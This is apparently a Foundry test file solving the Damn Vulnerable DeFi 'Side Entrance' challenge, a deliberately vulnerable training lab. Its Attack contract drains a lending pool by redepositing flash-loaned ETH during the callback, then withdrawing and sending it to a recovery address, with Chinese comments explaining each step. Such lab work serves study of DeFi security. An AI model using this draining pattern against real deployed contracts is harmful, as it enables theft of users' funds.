// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        Attack att = new Attack(address(pool));
        att.attack(ETHER_IN_POOL, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }

}

contract Attack {

    //声明合约
    SideEntranceLenderPool pool;

    //初始化SideEntranceLenderPool合约
    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
    }

    function attack(uint256 ETHER_IN_POOL, address recovery) external {
        pool.flashLoan(ETHER_IN_POOL);//借贷 1000 WTH
        pool.withdraw();//提取存入的全部 1000 WTH
        payable(recovery).transfer(address(this).balance);//把全部的 1000 WTH转账给recovery
    }

    //实现回调函数并以攻击者的名义调用deposit，把闪电贷借出的 1000 ETH存入pool合约
    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    //回调函数收钱
    receive() external payable {}

}
